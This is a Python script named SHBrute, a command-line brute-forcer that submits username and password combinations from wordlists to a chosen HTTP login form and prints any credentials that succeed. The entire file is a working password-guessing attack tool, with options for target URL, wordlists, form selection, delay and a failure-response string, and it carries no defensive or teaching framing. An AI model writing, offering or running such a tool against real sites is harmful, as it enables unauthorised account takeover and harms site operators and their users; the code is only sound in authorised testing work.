import mechanize
import argparse
from time import sleep
from rich import print
from rich.console import Console


console = Console()

parser = argparse.ArgumentParser(description='SHBrute - Simple Http *Form* Bruteforcer')
parser.add_argument('-t', '--target', metavar='url', help='Whole url to the HTTP login form ex. "http://web.com/login"')

parser.add_argument('-u', '--user', metavar='name', help='single username (For wordlist use -U)')
parser.add_argument('-U', '--users', metavar='wordlist', help='wordlist option for username')

parser.add_argument('-p', '--password', metavar='password', help='single password (For wordlist use -P')
parser.add_argument('-P', '--passwords', metavar='wordlist', help='wordlist option for password')


parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
parser.add_argument('-f', '--form', metavar='num', help='http form number (if there are multiple forms)', type=int)
parser.add_argument('-w', '--wait', metavar='seconds', help='wait time between requests', type=float)
parser.add_argument('-F̈́', '--fail', metavar='str', help='response with failed login', type=str)
args = parser.parse_args()

print('[bold]SHBrute[/]')


def load_configuration():
    br = mechanize.Browser()
    if args.users:
        with open(args.users, 'r') as f:
            userlist = f.read().splitlines()
    else:
        userlist = [args.user]

    if args.passwords:
        with open(args.passwords, 'r') as f:
            passwords = f.read().splitlines()
    else:
        passwords = [args.password]
    
    return br, userlist, passwords


def try_configuration(url, user, password):
    br.select_form(nr=args.form)
    br.form['username'] = user
    br.form['password'] = password
    response = br.submit()
    
    if args.fail in str(response.read()):
        if args.verbose:
            print(f'[bold red][-][/] Tried: {user}:{password}')
        else:
            pass
    else:
        print(f'[bold green][+] [blink]SUCCESS[/][/]')
        print(f'[bold cyan]URL: {url}[/]')
        print(f'[bold cyan]User:[/] [magenta]{user}[/]')
        print(f'[bold cyan]Password:[/] [magenta]{password}[/]')
        exit()


if __name__ == '__main__':
    url = args.target
    br, userlist, passwords = load_configuration()
    
    br.open(url)
    for user in userlist:
        for passwd in passwords:
            try_configuration(url, user, passwd)
            sleep(args.wait)
